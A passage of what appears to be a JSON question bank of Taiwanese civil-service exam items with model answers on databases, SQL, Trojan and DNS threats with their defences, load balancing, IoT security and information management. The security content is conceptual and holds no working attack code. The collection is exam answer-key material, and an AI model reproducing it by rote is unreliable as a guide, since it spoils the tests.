<td>時間複雜度</td>\r\n                    <td>平均與最壞為 O(n)</td>\r\n                    <td>平均與最壞為 O(log n)</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>主要優點</td>\r\n                    <td>簡單、彈性高、資料未排序也可用</td>\r\n                    <td>搜尋速度快，適合大量靜態或少變動資料</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>主要缺點</td>\r\n                    <td>資料量大時效率差</td>\r\n                    <td>需排序且較依賴隨機存取結構</td>\r\n                  </tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n          </section>"
  },
  {
    "id": 22,
    "slug": "question-22",
    "title": "關聯模式的四種基本限制",
    "points": "30 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-disability-third-database-application",
    "order": "一",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">一</span>\n            <div>\n              <h2>關聯模式的四種基本限制</h2>\n              <p>配分 30 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              關聯模式是目前 DBMS 常用的資料模式之一。在關聯中新增 tuple 必須滿足一些限制，其中定義域限制、關聯鍵限制、實體完整性限制與參考完整性限制為四種基本限制。請分別說明其意義並舉例。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>限制意義與例子</h3>\n            <ul>\n              <li><strong>定義域限制：</strong>屬性值必須屬於允許的型態、格式或範圍。例如 <code>Age</code> 必須是非負整數，<code>Gender</code> 只能是系統定義的代碼。</li>\n              <li><strong>關聯鍵限制：</strong>候選鍵或主鍵必須唯一識別 tuple，不可有兩筆資料鍵值相同。例如兩位學生不可有相同 <code>StudentID</code>。</li>\n              <li><strong>實體完整性限制：</strong>主鍵不可為 NULL，否則無法識別實體。例如新增學生時 <code>StudentID</code> 不可空白。</li>\n              <li><strong>參考完整性限制：</strong>外鍵值必須為 NULL 或對應到被參考表中的既有鍵值。例如 <code>Student.DeptID</code> 必須存在於 <code>Department.DeptID</code>。</li>\n            </ul>\n          </section>"
  },
  {
    "id": 23,
    "slug": "question-23",
    "title": "ERD 轉換為資料庫綱目",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-disability-third-database-application",
    "order": "二",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">二</span>\n            <div>\n              <h2>ERD 轉換為資料庫綱目</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              將題目 ERD 轉換成資料庫綱目，並在各個關聯綱目中標示主要鍵與外來鍵參考。圖中 X、Y、W 為一般實體，Z 為弱實體；XC 為 X 的多值屬性；R2 為 Y 與 Z 的識別關係；R3 有屬性 RC。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>參考綱目</h3>\n            <pre><code>X(\n  XA PK,\n  XB\n)\n\nX_XC(\n  XA PK/FK REFERENCES X(XA),\n  XC PK\n)\n\nY(\n  YA PK,\n  YB PK,\n  YC,\n  XA FK REFERENCES X(XA)\n)\n\nW(\n  WA PK,\n  WB,\n  XA FK UNIQUE NOT NULL REFERENCES X(XA)\n)\n\nZ(\n  YA PK/FK,\n  YB PK/FK,\n  ZA PK,\n  ZB,\n  FOREIGN KEY (YA, YB) REFERENCES Y(YA, YB)\n)\n\nR3(\n  XA PK/FK REFERENCES X(XA),\n  YA PK,\n  YB PK,\n  ZA PK,\n  RC,\n  FOREIGN KEY (YA, YB, ZA) REFERENCES Z(YA, YB, ZA)\n)\n\nR5(\n  ParentXA PK/FK REFERENCES X(XA),\n  ChildXA PK/FK REFERENCES X(XA)\n)</code></pre>\n            <p>\n              多值屬性 <code>XC</code> 獨立成表；R1 為 X 對 Y 的 1:M，所以把 X 的鍵放到 Y。R2 是 Y 與弱實體 Z 的識別關係，因此 Z 的主鍵由 Y 的鍵加上部分鍵 <code>ZA</code> 組成。R3 是 X 與 Z 的 M:N 關係且有屬性 <code>RC</code>，需獨立成表。R5 是 X 的遞迴 1:M 關係，可用兩個角色欄位表示。\n            </p>\n          </section>"
  },
  {
    "id": 24,
    "slug": "question-24",
    "title": "Lost Update 與 Dirty Read",
    "points": "20 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-disability-third-database-application",
    "order": "三",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">三</span>\n            <div>\n              <h2>Lost Update 與 Dirty Read</h2>\n              <p>配分 20 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              DBMS 在沒有適當並行控制機制時，任意交錯處理多個交易的運算動作，可能造成錯誤結果。請就遺失更新問題與污染讀取問題，舉例說明發生原因並解釋。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>遺失更新 Lost Update</h3>\n            <p>\n              假設帳戶餘額 A 原本為 1000。交易 T1 要存入 100，交易 T2 要存入 200。若兩者都先讀到 A = 1000，T1 寫回 1100，T2 也用舊值寫回 1200，則 T1 的更新被覆蓋，正確結果 1300 遺失。\n            </p>\n            <pre><code>T1: READ A = 1000\nT2: READ A = 1000\nT1: A = A + 100; WRITE A = 1100\nT2: A = A + 200; WRITE A = 1200</code></pre>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>污染讀取 Dirty Read</h3>\n            <p>\n              假設 A 原本為 1000。T1 先把 A 改成 500 但尚未 commit，T2 讀到 500 並進行計算；若 T1 後來 rollback，A 應恢復 1000，但 T2 已使用未確認的暫時資料。\n            </p>\n            <pre><code>T1: WRITE A = 500   -- 尚未 commit\nT2: READ A = 500    -- 讀到未提交資料\nT1: ROLLBACK        -- A 回復為 1000</code></pre>\n            <p>\n              這類問題可透過鎖定、兩階段鎖定、時間戳記排序或適當交易隔離層級避免。\n            </p>\n          </section>"
  },
  {
    "id": 25,
    "slug": "question-25",
    "title": "會員網路遊戲資料庫 SQL 查詢",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料庫應用",
    "subjectSlug": "115-disability-third-database-application",
    "order": "四",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">四</span>\n            <div>\n              <h2>會員網路遊戲資料庫 SQL 查詢</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              會員資料、儲值資料、遊戲資料與遊戲紀錄資料為一會員網路遊戲資料庫。請撰寫 SQL 查詢會員玩遊戲資料、未玩過遊戲會員、不同性別會員平均花費點數，以及介紹人介紹會員統計。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3> 會員玩遊戲資料</h3>\n            <pre><code>SELECT\n  m.編號 AS 會員編號,\n  m.姓名 AS 會員姓名,\n  g.遊戲名稱,\n  r.參與遊戲日期時間\nFROM 會員資料 AS m\nJOIN 遊戲紀錄資料 AS r ON r.會員編號 = m.編號\nJOIN 遊戲資料 AS g ON g.遊戲編號 = r.遊戲編號;</code></pre>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3> 沒有玩過遊戲會員</h3>\n            <pre><code>SELECT\n  m.編號 AS 會員編號,\n  m.姓名 AS 會員姓名,\n  m.性別 AS 會員性別,\n  m.加入會員日期\nFROM 會員資料 AS m\nLEFT JOIN 遊戲紀錄資料 AS r ON r.會員編號 = m.編號\nWHERE r.會員編號 IS NULL;</code></pre>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3> 不同性別下所有會員平均花費點數</h3>\n            <pre><code>SELECT\n  性別 AS 會員性別,\n  ROUND(AVG(總花費點數), 2) AS 平均花費點數\nFROM (\n  SELECT\n    m.編號,\n    m.性別,\n    COALESCE(SUM(g.花費點數), 0) AS 總花費點數\n  FROM 會員資料 AS m\n  LEFT JOIN 遊戲紀錄資料 AS r ON r.會員編號 = m.編號\n  LEFT JOIN 遊戲資料 AS g ON g.遊戲編號 = r.遊戲編號\n  GROUP BY m.編號, m.性別\n) AS member_cost\nGROUP BY 性別;</code></pre>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3> 介紹人介紹會員人數統計</h3>\n            <pre><code>SELECT\n  ref.編號 AS 介紹人編號,\n  ref.姓名 AS 介紹人姓名,\n  ref.性別 AS 介紹人性別,\n  COUNT(mem.編號) AS 介紹會員人數\nFROM 會員資料 AS ref\nJOIN 會員資料 AS mem ON mem.介紹人編號 = ref.編號\nGROUP BY ref.編號, ref.姓名, ref.性別\nHAVING COUNT(mem.編號) &gt; 4\nORDER BY 介紹會員人數 DESC;</code></pre>\n          </section>"
  },
  {
    "id": 26,
    "slug": "question-26",
    "title": "木馬程式特性、感染途徑與網通設備威脅",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路與安全",
    "subjectSlug": "115-disability-third-network-security",
    "order": "一",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">一</span>\n            <div>\n              <h2>木馬程式特性、感染途徑與網通設備威脅</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              請詳細說明木馬程式（Trojan Horse）的特性及常見的感染途徑，並說明若網通設備遭受植入木馬程式，將可能造成那些資安威脅？\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>木馬程式的特性</h3>\n            <p>\n              木馬程式通常偽裝成正常軟體、文件、更新檔或管理工具，誘使使用者或管理者執行。它和病毒、蠕蟲不同，重點不一定是自我複製，而是透過偽裝、社交工程或供應鏈滲透取得執行機會，再在系統中執行攻擊者指定的行為。\n            </p>\n            <p>\n              常見特性包括隱蔽性高、可建立後門、可竊取帳密與組態、可下載其他惡意程式、可關閉防護機制，並可能長期潛伏等待攻擊者指令。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>常見感染途徑</h3>\n            <ul>\n              <li>釣魚郵件或即時通訊連結：以附件、巨集文件、壓縮檔或假登入頁誘導執行。</li>\n              <li>偽裝軟體與破解工具：以免費工具、盜版軟體、外掛程式或假更新檔包裝木馬。</li>\n              <li>網站下載與惡意廣告：使用者從不可信網站下載安裝檔，或被導向惡意下載頁。</li>\n              <li>漏洞利用：攻擊者利用作業系統、瀏覽器、VPN、路由器或管理介面的漏洞植入木馬。</li>\n              <li>供應鏈或韌體更新遭污染：合法更新來源、套件或設備韌體被置入惡意程式。</li>\n              <li>弱密碼與遠端管理暴露：透過 Telnet、SSH、Web 管理介面或預設帳密登入設備。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>網通設備被植入木馬的威脅</h3>\n            <p>\n              路由器、交換器、防火牆、無線基地台或 VPN 設備位於流量路徑上，一旦被植入木馬，攻擊者可能竊聽、轉送或改寫大量封包，影響範圍通常大於單一端點。\n            </p>\n            <ul>\n              <li>流量竊聽：攔截帳密、Cookie、內部系統連線資訊與敏感資料。</li>\n              <li>中間人攻擊：竄改 DNS、路由或憑證設定，導向假網站或攔截加密連線。</li>\n              <li>後門存取：攻擊者可長期遠端控制設備，繞過邊界防護進入內部網路。</li>\n              <li>橫向移動：利用設備信任位置掃描內網，攻擊伺服器、終端與管理系統。</li>\n              <li>服務中斷：修改 ACL、路由表、防火牆規則或發動大量流量造成 DoS/DDoS。</li>\n              <li>殭屍網路節點：被用來發送垃圾流量、代理攻擊或隱藏攻擊來源。</li>\n              <li>組態外洩：匯出 VPN 金鑰、SNMP community、管理帳密、網段拓樸與安全政策。</li>\n            </ul>\n          </section>"
  },
  {
    "id": 27,
    "slug": "question-27",
    "title": "負載平衡運作原理與架設效益",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路與安全",
    "subjectSlug": "115-disability-third-network-security",
    "order": "二",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">二</span>\n            <div>\n              <h2>負載平衡運作原理與架設效益</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              請詳細說明負載平衡（Load Balancing）技術的運作原理，並說明在網路系統上架設負載平衡伺服器的好處。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>運作原理</h3>\n            <p>\n              負載平衡是將使用者請求分散到多台後端伺服器的技術。使用者通常連到一個對外的虛擬 IP 或網域名稱，負載平衡器再依演算法、連線狀態與健康檢查結果，選擇合適的後端伺服器處理請求。\n            </p>\n            <p>\n              L4 負載平衡依 TCP/UDP、來源位址、目的位址與連接埠轉送連線，速度快且較接近封包層。L7 負載平衡理解 HTTP/HTTPS 等應用層資訊，可依 URL、Header、Cookie、Host 或 API 路徑分流。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>常見分配策略</h3>\n            <ul>\n              <li><strong>Round Robin：</strong>依序把請求分給每台伺服器，適合能力相近的主機。</li>\n              <li><strong>Weighted Round Robin：</strong>依伺服器效能設定權重，能力較強者承接較多流量。</li>\n              <li><strong>Least Connections：</strong>將新連線導向目前連線數較少的伺服器。</li>\n              <li><strong>IP Hash：</strong>依來源 IP 計算分配結果，常用於維持同一來源連到固定後端。</li>\n              <li><strong>Health Check：</strong>定期檢查後端服務是否正常，故障主機會被暫時移出。</li>\n              <li><strong>Session Persistence：</strong>透過 Cookie 或來源位址維持會話黏著，避免登入狀態中斷。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>架設負載平衡伺服器的好處</h3>\n            <ul>\n              <li>提升可用性：單一後端故障時，流量可導向其他健康伺服器。</li>\n              <li>提升效能：分散請求，降低單台伺服器 CPU、記憶體與網路壓力。</li>\n              <li>水平擴充：流量成長時可增加後端伺服器，不必只升級單一大型主機。</li>\n              <li>維護不中斷：可先將某台伺服器從池中移除，完成更新後再加入。</li>\n              <li>集中安全控管：可集中處理 TLS 終止、WAF、存取控制、速率限制與日誌。</li>\n              <li>改善使用者體驗：降低回應時間，並能依地區或服務類型導向適合節點。</li>\n            </ul>\n          </section>"
  },
  {
    "id": 28,
    "slug": "question-28",
    "title": "物聯網設備連網安全保護作法",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路與安全",
    "subjectSlug": "115-disability-third-network-security",
    "order": "三",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">三</span>\n            <div>\n              <h2>物聯網設備連網安全保護作法</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              許多家電、汽車、工業製造等物聯網設備（Internet of Things），有嵌入無線感測器（Sensors）並具備連網功能，請詳細說明實務上有那些作法可用於保護這些物聯網設備的連網安全性。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>設備身分與存取控制</h3>\n            <p>\n              物聯網設備數量多且常分散部署，首先要確保每台設備有可識別且不可共用的身分。實務上可使用裝置憑證、金鑰、硬體安全模組或安全元素保存機密，避免使用出廠預設帳密。管理介面應強制修改預設密碼，採最小權限與角色控管，並停用不必要的帳號與服務。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>通訊保護</h3>\n            <ul>\n              <li>使用 TLS、DTLS、IPsec 或 VPN 保護資料傳輸，避免明文傳送感測資料與控制命令。</li>\n              <li>採雙向認證，讓設備驗證伺服器，伺服器也驗證設備，降低偽裝與中間人風險。</li>\n              <li>使用安全的無線設定，例如 WPA3 或妥善設定的 WPA2，避免弱密碼與開放網路。</li>\n              <li>對 MQTT、CoAP、HTTP API 等協定設定權限、主題範圍與速率限制。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>韌體與生命週期管理</h3>\n            <ul>\n              <li>安全開機 Secure Boot：只允許經簽章驗證的韌體啟動。</li>\n              <li>韌體簽章與 OTA 更新：更新檔需驗證來源與完整性，避免被植入惡意韌體。</li>\n              <li>漏洞修補流程：設備供應商需提供更新機制，企業需建立盤點與修補排程。</li>\n              <li>退役處理：設備汰換時清除憑證、金鑰、組態與本機資料。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>網路隔離與監控</h3>\n            <p>\n              IoT 設備應與辦公網路、核心伺服器、管理網路分段，例如使用 VLAN、子網、零信任閘道或防火牆規則限制可連線對象。只允許必要的目的地、連接埠與協定，避免設備被入侵後成為橫向移動跳板。\n            </p>\n            <p>\n              另外可透過日誌、流量監控、異常行為偵測與資產盤點掌握設備狀態。例如偵測設備是否突然連到陌生國外 IP、產生大量 DNS 查詢、掃描內網或傳送異常流量。對工業或車用環境，還應考量安全性與可用性，避免防護機制造成控制系統中斷。\n            </p>\n          </section>"
  },
  {
    "id": 29,
    "slug": "question-29",
    "title": "DNS 資安攻擊類型與防制作法",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資通網路與安全",
    "subjectSlug": "115-disability-third-network-security",
    "order": "四",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">四</span>\n            <div>\n              <h2>DNS 資安攻擊類型與防制作法</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              請舉出至少兩種針對域名系統（Domain Name System，簡稱 DNS）的資安攻擊類型，並詳細說明防制這些潛在資安攻擊的作法。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>常見 DNS 攻擊類型</h3>\n            <ul>\n              <li><strong>DNS Cache Poisoning：</strong>攻擊者將偽造的解析結果寫入快取 DNS，使使用者被導向惡意網站。</li>\n              <li><strong>DNS Spoofing：</strong>在區域網路或傳輸路徑上偽造 DNS 回應，讓受害者取得錯誤 IP。</li>\n              <li><strong>DNS Amplification DDoS：</strong>利用開放遞迴 DNS 伺服器放大流量，對目標發動阻斷服務攻擊。</li>\n              <li><strong>DNS Tunneling：</strong>把資料藏在 DNS 查詢與回應中，用於繞過防火牆或進行資料外洩。</li>\n              <li><strong>Domain Hijacking：</strong>攻擊註冊商帳號或 DNS 管理權限，竄改網域 NS、A、MX 等紀錄。</li>\n              <li><strong>NXDOMAIN Flood：</strong>大量查詢不存在的子網域，耗盡權威 DNS 或遞迴 DNS 資源。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>防制作法</h3>\n            <p>\n              對 Cache Poisoning 與 Spoofing，可部署 DNSSEC，讓 DNS 回應具有數位簽章驗證，降低被竄改或偽造的風險。遞迴 DNS 也應啟用來源連接埠隨機化、交易 ID 隨機化、0x20 大小寫隨機化等機制，增加偽造回應成功難度。使用者端可改用可信賴的 DNS resolver，並透過 DoT 或 DoH 保護查詢傳輸。\n            </p>\n            <p>\n              對 DDoS 與濫用，應避免將遞迴 DNS 開放給全網際網路，只允許內部或授權來源使用；也可設定 Response Rate Limiting、採用 Anycast DNS、多地節點與 DDoS 防護服務，並監控異常查詢量、來源分布、查詢類型與 NXDOMAIN 比例。\n            </p>\n            <p>\n              對 DNS Tunneling，可分析查詢長度、查詢頻率、可疑子網域型態、異常 TXT 查詢與未知網域比例，並搭配 DNS 防火牆、威脅情資黑名單、出口流量控管與資料外洩防護。對網域劫持，應保護註冊商與 DNS 管理帳號，啟用多因素驗證、網域鎖定、權限分離、變更審核與 DNS 紀錄異動告警。\n            </p>\n          </section>"
  },
  {
    "id": 30,
    "slug": "question-30",
    "title": "旅遊公司社群經營企劃與行動方案",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊管理",
    "subject": "資訊管理",
    "subjectSlug": "115-disability-third-information-management",
    "order": "一",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">一</span>\n            <div>\n              <h2>旅遊公司社群經營企劃與行動方案</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              假設你是 A 旅遊公司新上任的數位行銷與社群經營總監，面對旅遊市場競爭與旅客資訊來源碎片化，請規劃整體社群媒體經營策略。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>目標受眾與平台定位</h3>\n            <p>\n              社群經營目標應從單純增加粉絲，轉為建立「看見品牌、產生興趣、詢問行程、完成訂購、旅後分享」的完整旅客旅程。親子家庭重視安全、飯店與行程順暢，適合 Facebook、LINE 與 YouTube；年輕自由行旅客重視靈感、短影音與限時優惠，適合 Instagram、Threads、Reels 與 Shorts；熟齡與銀髮客重視清楚說明與客服信任，適合 Facebook、LINE 官方帳號與說明型影片；高端與主題旅客則重視深度體驗、質感內容與專業規劃。\n            </p>\n            <p>\n              Facebook 作為信任與活動公告平台，發布完整行程、旅客見證、直播說明會與社團互動；Instagram 用於視覺種草，經營景點懶人包、短影音、限動投票與旅遊美照；Threads 負責即時話題、口語互動與品牌人格；YouTube 經營目的地指南、領隊導覽與行前說明；LINE 官方帳號承接轉換，提供優惠推播、分眾標籤、客服導購與出團提醒。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>內容策略與創意發想</h3>\n            <ul>\n              <li><strong>旅遊靈感型：</strong>季節景點、節慶活動、私房路線、第一次出國推薦，用來吸引新受眾。</li>\n              <li><strong>決策比較型：</strong>團體旅遊與自由行比較、預算試算、航班飯店差異、親子友善清單，用來協助下單。</li>\n              <li><strong>信任證明型：</strong>旅客心得、領隊介紹、真實出團花絮、客服問答，用來降低購買疑慮。</li>\n              <li><strong>轉換促銷型：</strong>早鳥優惠、限時團位、連假專案、LINE 會員券，用來導向詢問與訂購。</li>\n              <li><strong>售後陪伴型：</strong>行前準備、入境規定、天氣提醒、旅後照片募集，用來提升滿意度與回購。</li>\n            </ul>\n            <p>\n              執行上可建立月主題、週欄目、日素材制度，例如每月主打日本賞楓、歐洲聖誕市集或親子暑假；每週固定發布目的地攻略、旅客 QA、領隊短影音與優惠資訊；每日則依搜尋趨勢、天氣、新聞與留言快速產生互動內容。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>合作、數據與危機管理</h3>\n            <p>\n              跨界合作可結合航空公司、飯店、信用卡、旅遊用品、攝影師、親子部落客、在地餐廳與政府觀光單位，推出聯名優惠與內容共創。公司內部也應整合產品、客服、業務與領隊資訊，讓社群內容能反映真實行程賣點。\n            </p>\n            <p>\n              KPI 應分層設計：曝光層看觸及、觀看率、粉絲成長；互動層看留言、分享、收藏、私訊；轉換層看 LINE 加好友、官網點擊、表單填寫、成交金額；留存層看回購率、會員活躍度與旅後評價。每月檢討熱門內容、低效素材、廣告投報率與客訴來源，並用 A/B test 測試標題、封面、CTA 與受眾包。\n            </p>\n            <p>\n              公關危機應建立負評分級與回應 SOP。一般抱怨需快速回覆並轉客服追蹤；涉及安全、糾紛、天災或重大行程異動時，由公關、法務、產品與客服共同核稿，先表達理解與處理承諾，再提出具體補救。面對錯假訊息，應以事實、時間軸與官方公告澄清，必要時發布置頂聲明。\n            </p>\n          </section>"
  },
  {
    "id": 31,
    "slug": "question-31",
    "title": "ISMS 導入內部說明會簡報大綱",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊管理",
    "subject": "資訊管理",
    "subjectSlug": "115-disability-third-information-management",
    "order": "二",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">二</span>\n            <div>\n              <h2>ISMS 導入內部說明會簡報大綱</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              地政機關即將導入 ISMS，請為非技術背景同仁設計 15 分鐘內部說明，說明地政資料風險、ISMS 意義、對同仁的好處與日常工作改變。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>簡報大綱</h3>\n            <div class=\"table-wrap\">\n              <table>\n                <thead>\n                  <tr>\n                    <th>時間</th>\n                    <th>主題</th>\n                    <th>重點</th>\n                  </tr>\n                </thead>\n                <tbody>\n                  <tr>\n                    <td>0-3 分鐘</td>\n                    <td>地政資料為何高風險</td>\n                    <td>土地、建物、身分、財產與交易資訊集中，對詐騙與駭客有高價值。</td>\n                  </tr>\n                  <tr>\n                    <td>3-6 分鐘</td>\n                    <td>什麼是 ISMS</td>\n                    <td>ISMS 是持續管理資訊安全風險的制度，不只是買設備或拿認證。</td>\n                  </tr>\n                  <tr>\n                    <td>6-10 分鐘</td>\n                    <td>對同仁的好處</td>\n                    <td>降低帳號被盜、誤寄資料與責任不明的風險。</td>\n                  </tr>\n                  <tr>\n                    <td>10-15 分鐘</td>\n                    <td>日常工作改變</td>\n                    <td>密碼、權限、文件保存、USB、電子郵件與事件通報都會更標準化。</td>\n                  </tr>\n                </tbody>\n              </table>\n            </div>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>重點說明</h3>\n            <p>\n              地政資料包含所有權人身分、土地與建物資料、抵押設定、繼承買賣紀錄、謄本申請與案件進度。若外洩，詐騙集團可用於假買賣、假代書、投資詐騙、精準釣魚信，甚至推估民眾財產狀況進行勒索。因此地政資料同時具備可辨識個人、可推估財產、可組合其他資料庫三種價值。\n            </p>\n            <p>\n              ISMS 是 Information Security Management System，資訊安全管理系統。它的核心是用制度化方式管理風險，包含資產盤點、風險評估、控制措施、教育訓練、事件通報、內部稽核與持續改善。可用一句話說明：ISMS 是讓每位同仁知道哪些資料重要、誰能使用、怎麼使用、出事怎麼處理。\n            </p>\n            <p>\n              對同仁而言，ISMS 可讓責任更清楚、流程更可依循，也能降低因帳號共用、誤寄資料、誤點釣魚信而造成的個人風險。導入後的具體改變包括不得共用帳號、提高密碼與多因素驗證要求、依職務授權查詢資料、紙本與電子檔依機密等級保存、限制 USB 與私人雲端、遇到可疑郵件或資料外洩疑慮時立即通報。這些改變不是增加麻煩，而是把過去靠個人小心的工作，改成全機關共同防護。\n            </p>\n          </section>"
  },
  {
    "id": 32,
    "slug": "question-32",
    "title": "1999 AI 客服歷史資料清洗與預處理專案",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊管理",
    "subject": "資訊管理",
    "subjectSlug": "115-disability-third-information-management",
    "order": "三",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">三</span>\n            <div>\n              <h2>1999 AI 客服歷史資料清洗與預處理專案</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              某縣市政府 1999 話務中心欲推出 AI 語音/文字智慧客服，手上有 5 年通話錄音與文字工單。請規劃如何清洗與預處理資料，使其成為可用於訓練或建置 AI 客服系統的高品質數據。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>專案流程</h3>\n            <p>\n              本專案目標是把錄音與工單從混亂紀錄轉為可搜尋、可標註、可訓練、可稽核的資料資產。執行前需建立資料治理原則，確認資料使用目的、授權範圍、保存期限、個資保護要求、標註品質標準與人工抽驗比例。\n            </p>\n            <ul>\n              <li><strong>語音轉換與語者分離：</strong>先統一錄音格式、取樣率、聲道與檔名，再使用 ASR 轉逐字稿，並區分民眾、話務員與第三方。對台語、客語、口音或噪音重的片段標記信心分數，低信心資料送人工校對或排除。</li>\n              <li><strong>個資抹除與去識別化：</strong>偵測姓名、電話、身分證字號、地址、車牌、門牌、案件編號與財產資訊，替換為 [姓名]、[電話]、[地址] 等標籤。若保留音檔，應考慮聲紋去識別化。</li>\n              <li><strong>雜訊過濾與無效資料剔除：</strong>移除空白錄音、測試電話、惡作劇、重複來電、斷線片段、背景音過大、無案件分類或內容過短的資料。</li>\n              <li><strong>歷史糾錯與時效性清洗：</strong>修正錯字、縮寫、舊稱與非標準用語，例如「垃車」統一為「垃圾車」。已廢止法規、舊局處名稱、過期活動或疫情期間特殊規定需移除或標註有效期間。</li>\n              <li><strong>資料結構化與 Q&amp;A 萃取：</strong>轉成來電意圖、問題摘要、涉及局處、地點、處理方式、處理結果、回覆口徑、法規依據、有效日期與信心等級等欄位。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>成果與控管</h3>\n            <p>\n              清洗後可從高頻案件萃取標準 Q&amp;A，例如垃圾清運、路燈故障、噪音檢舉、違停拖吊、道路坑洞與社福補助。每組 Q&amp;A 必須連回權責機關與正式資料來源，並由業務單位審核。最後將資料切分為訓練集、驗證集、測試集與稽核資料；歷史資料不應全部直接丟入模型，而要形成可控知識庫、意圖分類資料、對話範例與標準回覆模板，並建立定期更新機制。\n            </p>\n          </section>"
  },
  {
    "id": 33,
    "slug": "question-33",
    "title": "國外 SaaS 公司股價大跌與裁員原因分析",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊管理",
    "subject": "資訊管理",
    "subjectSlug": "115-disability-third-information-management",
    "order": "四",
